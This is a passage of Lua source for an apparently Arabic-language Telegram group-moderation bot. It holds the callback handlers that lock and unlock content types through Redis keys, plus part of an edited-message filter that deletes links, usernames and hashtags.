if tonumber(Text:match('(.*)/lockaudo')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم قفل الصوت '
redis:set(bot_id.."Tshakex:Lock:vico"..Chat_id,'del')  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/lockfwd') and Admin(data) then
if tonumber(Text:match('(.*)/lockfwd')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم قفل التوجيه '
redis:set(bot_id.."Tshakex:Lock:forward"..Chat_id,'del')  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/lockfile') and Admin(data) then
if tonumber(Text:match('(.*)/lockfile')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم قفل الملفات '
redis:set(bot_id.."Tshakex:Lock:Document"..Chat_id,'del')  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/lockphone') and Admin(data) then
if tonumber(Text:match('(.*)/lockphone')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم قفل الجهات '
redis:set(bot_id.."Tshakex:Lock:Contact"..Chat_id,'del')  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/lockposts') and Admin(data) then
if tonumber(Text:match('(.*)/lockposts')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم قفل الكلايش '
redis:set(bot_id.."Tshakex:Lock:Spam"..Chat_id,'del')  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/lockflood') and Admin(data) then
if tonumber(Text:match('(.*)/lockflood')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم قفل التكرار '
redis:hset(bot_id.."Tshakex:Spam:Group:User"..Chat_id ,"Spam:User",'del')  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/lockfarse') and Admin(data) then
if tonumber(Text:match('(.*)/lockfarse')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم قفل الفارسيه '
redis:set(bot_id..'lock:Fars'..Chat_id,true) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/lockfshar') and Admin(data) then
if tonumber(Text:match('(.*)/lockfshar')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم قفل السب '
redis:set(bot_id..'lock:Fshar'..Chat_id,true) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/lockenglish') and Admin(data) then
if tonumber(Text:match('(.*)/lockenglish')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم قفل الانجليزيه '
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/lockinlene') and Admin(data) then
if tonumber(Text:match('(.*)/lockinlene')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم قفل الانلاين '
redis:set(bot_id.."Tshakex:Lock:Inlen"..Chat_id,"del")  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
end
if Text and Text:match('(.*)/unlockjoine') and Admin(data) then
if tonumber(Text:match('(.*)/unlockjoine')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم فتح الاضافه '
redis:del(bot_id.."Tshakex:Lock:AddMempar"..Chat_id)
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/unlockchat') and Admin(data) then
if tonumber(Text:match('(.*)/unlockchat')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم فتح الدردشه '
redis:del(bot_id.."Tshakex:Lock:text"..Chat_id) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/unlock_joine') and Admin(data) then
if tonumber(Text:match('(.*)/unlock_joine')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم فتح الدخول '
redis:del(bot_id.."Tshakex:Lock:Join"..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/unlockbots') and Admin(data) then
if tonumber(Text:match('(.*)/unlockbots')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم فتح البوتات '
redis:del(bot_id.."Tshakex:Lock:Bot:kick"..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/unlocktags') and Admin(data) then
if tonumber(Text:match('(.*)/unlocktags')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم فتح الاشعارات '
redis:del(bot_id.."Tshakex:Lock:tagservr"..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/unlockedit') and Admin(data) then
if tonumber(Text:match('(.*)/unlockedit')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم فتح التعديل '
redis:del(bot_id.."Tshakex:Lock:edit"..Chat_id)
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/unlocklink') and Admin(data) then
if tonumber(Text:match('(.*)/unlocklink')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم فتح الروابط '
redis:del(bot_id.."Tshakex:Lock:Link"..Chat_id)
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/unlockusername') and Admin(data) then
if tonumber(Text:match('(.*)/unlockusername')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم فتح المعرفات '
redis:del(bot_id.."Tshakex:Lock:User:Name"..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/unlocktag') and Admin(data) then
if tonumber(Text:match('(.*)/unlocktag')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم فتح التاك '
redis:del(bot_id.."Tshakex:Lock:hashtak"..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/unlocksticar') and Admin(data) then
if tonumber(Text:match('(.*)/unlocksticar')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم فتح الملصقات '
redis:del(bot_id.."Tshakex:Lock:Sticker"..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/unlockgif') and Admin(data) then
if tonumber(Text:match('(.*)/unlockgif')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم فتح المتحركات '
redis:del(bot_id.."Tshakex:Lock:Animation"..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/unlockvideo') and Admin(data) then
if tonumber(Text:match('(.*)/unlockvideo')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم فتح الفيديو '
redis:del(bot_id.."Tshakex:Lock:Video"..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/unlockphoto') and Admin(data) then
if tonumber(Text:match('(.*)/unlockphoto')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم فتح الصور '
redis:del(bot_id.."Tshakex:Lock:Photo"..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/unlockvoise') and Admin(data) then
if tonumber(Text:match('(.*)/unlockvoise')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم فتح الاغاني '
redis:del(bot_id.."Tshakex:Lock:Audio"..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/unlockaudo') and Admin(data) then
if tonumber(Text:match('(.*)/unlockaudo')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم فتح الصوت '
redis:del(bot_id.."Tshakex:Lock:vico"..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/unlockfwd') and Admin(data) then
if tonumber(Text:match('(.*)/unlockfwd')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم فتح التوجيه '
redis:del(bot_id.."Tshakex:Lock:forward"..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/unlockfile') and Admin(data) then
if tonumber(Text:match('(.*)/unlockfile')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم فتح الملفات '
redis:del(bot_id.."Tshakex:Lock:Document"..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/unlockphone') and Admin(data) then
if tonumber(Text:match('(.*)/unlockphone')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم فتح الجهات '
redis:del(bot_id.."Tshakex:Lock:Contact"..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/unlockposts') and Admin(data) then
if tonumber(Text:match('(.*)/unlockposts')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم فتح الكلايش '
redis:del(bot_id.."Tshakex:Lock:Spam"..Chat_id) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/unlockflood') and Admin(data) then
if tonumber(Text:match('(.*)/unlockflood')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم فتح التكرار '
redis:hdel(bot_id.."Tshakex:Spam:Group:User"..Chat_id ,"Spam:User")  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/unlockfarse') and Admin(data) then
if tonumber(Text:match('(.*)/unlockfarse')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم فتح الفارسيه '
redis:del(bot_id..'lock:Fars'..Chat_id) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/unlockfshar') and Admin(data) then
if tonumber(Text:match('(.*)/unlockfshar')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم فتح السب '
redis:del(bot_id..'lock:Fshar'..Chat_id) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/unlockenglish') and Admin(data) then
if tonumber(Text:match('(.*)/unlockenglish')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم فتح الانجليزيه '
redis:del(bot_id..'lock:Fars'..Chat_id) 
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/unlockinlene') and Admin(data) then
if tonumber(Text:match('(.*)/unlockinlene')) == tonumber(data.sender_user_id_) then
local Textedit = '• تم فتح الانلاين '
redis:del(bot_id.."Tshakex:Lock:Inlen"..Chat_id)  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homelocks"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  end
elseif Text and Text:match('(.*)/homelocks') and Admin(data) then
if tonumber(Text:match('(.*)/homelocks')) == tonumber(data.sender_user_id_) then
local Texti = 'تستطيع قفل وفتح عبر الازرار'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'قفل الاضافه', callback_data=data.sender_user_id_.."/lockjoine"},{text = 'فتح الاضافه', callback_data=data.sender_user_id_.."/unlockjoine"},
},
{
{text = 'قفل الدردشه', callback_data=data.sender_user_id_.."/lockchat"},{text = 'فتح الدردشه', callback_data=data.sender_user_id_.."/unlockchat"},
},
{
{text = 'قفل الدخول', callback_data=data.sender_user_id_.."/lock_joine"},{text = 'فتح الدخول', callback_data=data.sender_user_id_.."/unlock_joine"},
},
{
{text = 'قفل البوتات', callback_data=data.sender_user_id_.."/lockbots"},{text = 'فتح البوتات', callback_data=data.sender_user_id_.."/unlockbots"},
},
{
{text = 'قفل الاشعارات', callback_data=data.sender_user_id_.."/locktags"},{text = 'فتح الاشعارات', callback_data=data.sender_user_id_.."/unlocktags"},
},
{
{text = 'قفل التعديل', callback_data=data.sender_user_id_.."/lockedit"},{text = 'فتح التعديل', callback_data=data.sender_user_id_.."/unlockedit"},
},
{
{text = 'قفل الروابط', callback_data=data.sender_user_id_.."/locklink"},{text = 'فتح الروابط', callback_data=data.sender_user_id_.."/unlocklink"},
},
{
{text = 'قفل المعرفات', callback_data=data.sender_user_id_.."/lockusername"},{text = 'فتح المعرفات', callback_data=data.sender_user_id_.."/unlockusername"},
},
{
{text = 'قفل التاك', callback_data=data.sender_user_id_.."/locktag"},{text = 'فتح التاك', callback_data=data.sender_user_id_.."/unlocktag"},
},
{
{text = 'قفل الملصقات', callback_data=data.sender_user_id_.."/locksticar"},{text = 'فتح الملصقات', callback_data=data.sender_user_id_.."/unlocksticar"},
},
{
{text = 'قفل المتحركه', callback_data=data.sender_user_id_.."/lockgif"},{text = 'فتح المتحركه', callback_data=data.sender_user_id_.."/unlockgif"},
},
{
{text = 'قفل الفيديو', callback_data=data.sender_user_id_.."/lockvideo"},{text = 'فتح الفيديو', callback_data=data.sender_user_id_.."/unlockvideo"},
},
{
{text = 'قفل الصور', callback_data=data.sender_user_id_.."/lockphoto"},{text = 'فتح الصور', callback_data=data.sender_user_id_.."/unlockphoto"},
},
{
{text = 'قفل الاغاني', callback_data=data.sender_user_id_.."/lockvoise"},{text = 'فتح الاغاني', callback_data=data.sender_user_id_.."/unlockvoise"},
},
{
{text = 'قفل الصوت', callback_data=data.sender_user_id_.."/lockaudo"},{text = 'فتح الصوت', callback_data=data.sender_user_id_.."/unlockaudo"},
},
{
{text = 'قفل التوجيه', callback_data=data.sender_user_id_.."/lockfwd"},{text = 'فتح التوجيه', callback_data=data.sender_user_id_.."/unlockfwd"},
},
{
{text = 'قفل الملفات', callback_data=data.sender_user_id_.."/lockfile"},{text = 'فتح الملفات', callback_data=data.sender_user_id_.."/unlockfile"},
},
{
{text = 'قفل الجهات', callback_data=data.sender_user_id_.."/lockphone"},{text = 'فتح الجهات', callback_data=data.sender_user_id_.."/unlockphone"},
},
{
{text = 'قفل الكلايش', callback_data=data.sender_user_id_.."/lockposts"},{text = 'فتح الكلايش', callback_data=data.sender_user_id_.."/unlockposts"},
},
{
{text = 'قفل التكرار', callback_data=data.sender_user_id_.."/lockflood"},{text = 'فتح التكرار', callback_data=data.sender_user_id_.."/unlockflood"},
},
{
{text = 'قفل الفارسيه', callback_data=data.sender_user_id_.."/lockfarse"},{text = 'فتح الفارسيه', callback_data=data.sender_user_id_.."/unlockfarse"},
},
{
{text = 'قفل السب', callback_data=data.sender_user_id_.."/lockfshar"},{text = 'فتح السب', callback_data=data.sender_user_id_.."/unlockfshar"},
},
{
{text = 'قفل الانجليزيه', callback_data=data.sender_user_id_.."/lockenglish"},{text = 'فتح الانجليزيه', callback_data=data.sender_user_id_.."/unlockenglish"},
},
{
{text = 'قفل الانلاين', callback_data=data.sender_user_id_.."/lockinlene"},{text = 'فتح الانلاين', callback_data=data.sender_user_id_.."/unlockinlene"},
},
{
{text = 'العوده', callback_data=data.sender_user_id_.."/help"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Texti)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
end

elseif data.ID == ("UpdateMessageEdited") then
tdcli_function ({ID = "GetMessage",chat_id_ = data.chat_id_,message_id_ = tonumber(data.message_id_)},function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then
return false 
end
local textedit = result.content_.text_
redis:incr(bot_id..'Tshakex:Num:Message:Edit'..result.chat_id_..result.sender_user_id_)
if redis:get(bot_id.."Tshakex:Lock:edit"..msg.chat_id_) and not textedit and not PresidentGroup(result) then
Delete_Message(result.chat_id_,{[0] = data.message_id_}) 
Send_Options(result,result.sender_user_id_,"reply","• قام بالتعديل على الميديا")  
end
if not Vips(result) then
------------------------------------------------------------------------
if textedit and textedit:match("[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]") or textedit and textedit:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or textedit and textedit:match("[Tt].[Mm][Ee]") or textedit and textedit:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or textedit and textedit:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if redis:get(bot_id.."Tshakex:Lock:Link"..msg.chat_id_) then
Delete_Message(result.chat_id_,{[0] = data.message_id_}) 
return false
end 
elseif textedit and textedit:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or textedit and textedit:match("[Tt].[Mm][Ee]") or textedit and textedit:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or textedit and textedit:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if redis:get(bot_id.."Tshakex:Lock:Link"..msg.chat_id_) then
Delete_Message(result.chat_id_,{[0] = data.message_id_}) 
return false
end 
elseif textedit and textedit:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or textedit and textedit:match("[Tt].[Mm][Ee]") or textedit and textedit:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or textedit and textedit:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if redis:get(bot_id.."Tshakex:Lock:Link"..msg.chat_id_) then
Delete_Message(result.chat_id_,{[0] = data.message_id_}) 
return false
end  
elseif textedit and textedit:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or textedit and textedit:match("[Tt].[Mm][Ee]") or textedit and textedit:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or textedit and textedit:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if redis:get(bot_id.."Tshakex:Lock:Link"..msg.chat_id_) then
Delete_Message(result.chat_id_,{[0] = data.message_id_}) 
return false
end  
elseif textedit and textedit:match("[hH][tT][tT][pP][sT]") or textedit and textedit:match("[tT][eE][lL][eE][gG][rR][aA].[Pp][Hh]") or textedit and textedit:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa].[Pp][Hh]") then
if redis:get(bot_id.."Tshakex:Lock:Link"..msg.chat_id_) then
Delete_Message(result.chat_id_,{[0] = data.message_id_}) 
return false
end  
elseif textedit and textedit:match("(.*)(@)(.*)") then
if redis:get(bot_id.."Tshakex:Lock:User:Name"..msg.chat_id_) then
Delete_Message(result.chat_id_,{[0] = data.message_id_}) 
return false
end  
elseif textedit and textedit:match("@") then
if redis:get(bot_id.."Tshakex:Lock:User:Name"..msg.chat_id_) then
Delete_Message(result.chat_id_,{[0] = data.message_id_}) 
return false
end  
elseif textedit and textedit:match("(.*)(#)(.*)") then
if redis:get(bot_id.."Tshakex:Lock:hashtak"..msg.chat_id_) then
Delete_Message(result.chat_id_,{[0] = data.message_id_}) 
return false
end  
elseif textedit and textedit:match("#") then
if redis:get(bot_id.."Tshakex:Lock:hashtak"..msg.chat_id_) then
Delete_Message(result.chat_id_,{[0] = data.message_id_}) 
return false
end  
elseif textedit and textedit:match("/") then
if redis:get(bot_id.."Tshakex:Lock:Cmd"..msg.chat_id_) then
Delete_Message(result.chat_id_,{[0] = data.message_id_}) 
return false
end 
elseif textedit and textedit:match("(.*)(/)(.*)") then
if redis:get(bot_id.."Tshakex:Lock:Cmd"..msg.chat_id_) then
Delete_Message(result.chat_id_,{[0] = data.message_id_}) 
return false
end 
elseif textedit then
